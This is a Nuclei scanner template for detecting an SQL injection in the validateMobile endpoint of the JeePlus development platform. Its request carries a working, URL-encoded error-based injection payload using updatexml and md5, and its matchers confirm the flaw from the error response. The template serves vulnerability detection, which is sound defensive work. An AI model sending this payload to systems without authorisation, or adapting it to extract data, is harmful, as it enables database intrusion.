id: jeeplus-validatemobile-sqli
info:
  name: JeePlus validateMobile SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL Injection vulnerability in the validateMobile endpoint of JeePlus rapid development platform.

variables:
  t1: "{{rand_int(1, 100000)}}"

http:
  - method: GET
    path:
      - "/a/sys/user/validateMobile?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%28{{t1}}%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "XPATH syntax error"
      - type: dsl
        dsl:
          - contains(body, substr(md5(t1), 0, 31))
